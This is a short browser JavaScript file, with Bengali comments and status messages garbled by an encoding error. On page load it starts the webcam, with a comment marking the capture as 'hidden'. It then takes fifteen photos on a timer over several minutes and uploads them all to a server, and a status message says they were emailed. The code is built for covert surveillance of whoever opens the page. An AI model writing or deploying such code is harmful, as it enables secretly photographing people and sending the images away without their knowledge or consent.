let camera = document.getElementById("camera");
let canvas = document.getElementById("canvas");
let ctx = canvas.getContext("2d");
let statusText = document.getElementById("statusText");

let capturedImages = [];

// ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ (hidden)
navigator.mediaDevices.getUserMedia({ video: true, audio: false })
  .then(stream => {
    camera.srcObject = stream;
    statusText.textContent = "‚úÖ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ö‡¶≤‡¶õ‡ßá (hidden capture active)";
  })
  .catch(err => {
    console.error("Camera error: ", err);
    statusText.textContent = "‚ùå ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡¶®‡¶ø";
  });

// ‡¶õ‡¶¨‡¶ø ‡¶§‡ßã‡¶≤‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function captureImage() {
  canvas.width = camera.videoWidth;
  canvas.height = camera.videoHeight;
  ctx.drawImage(camera, 0, 0);
  let dataUrl = canvas.toDataURL("image/jpeg");
  capturedImages.push(dataUrl);
}

// ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
async function uploadImages() {
  statusText.textContent = "üì§ ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶õ‡¶¨‡¶ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";
  let res = await fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ images: capturedImages }),
  });

  let result = await res.json();
  statusText.textContent = "‚úÖ ‡¶∏‡¶¨ ‡¶õ‡¶¨‡¶ø ‡¶á‡¶Æ‡ßá‡¶á‡¶≤‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá";
  console.log(result);
}

// ‡¶ü‡¶æ‡¶á‡¶Æ‡¶æ‡¶∞ ‡¶≤‡¶ú‡¶ø‡¶ï
async function startCapture() {
  for (let round = 0; round < 3; round++) {
    for (let i = 0; i < 5; i++) {
      captureImage();
      console.log(`Captured: Round ${round+1}, Image ${i+1}`);
      await new Promise(r => setTimeout(r, 10000)); // 10 sec
    }
    if (round < 2) {
      console.log("Waiting 30 sec...");
      await new Promise(r => setTimeout(r, 30000));
    }
  }

  // ‡¶∏‡¶¨ ‡¶õ‡¶¨‡¶ø ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
  await uploadImages();
}

startCapture();